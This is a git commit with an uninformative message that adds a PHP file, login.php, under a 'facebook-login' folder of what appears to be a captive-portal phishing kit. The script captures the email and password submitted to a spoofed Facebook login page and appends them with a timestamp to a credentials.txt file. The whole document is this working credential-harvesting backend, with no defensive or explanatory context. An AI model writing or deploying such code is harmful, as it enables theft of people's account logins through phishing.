9da535960681c9fe8a673b7097ef6003116033b2
matsob0123 sob <matsob0123@gmail.com>
2025-05-29 17:52:57 +0000

    ss

---
+++ android-portals-master/facebook-login/login.php
@@ -0,0 +1,8 @@
+<?php
+	$email = "email: ".$_POST['email']."\n";
+	$password = "password: ".$_POST['password']."\n";
+	$date = date('Y-m-d H:i:s')."Z"."\n";
+  $credential = $date.$email.$password."\n";
+  file_put_contents('credentials.txt', $credential, FILE_APPEND);
+
+?>
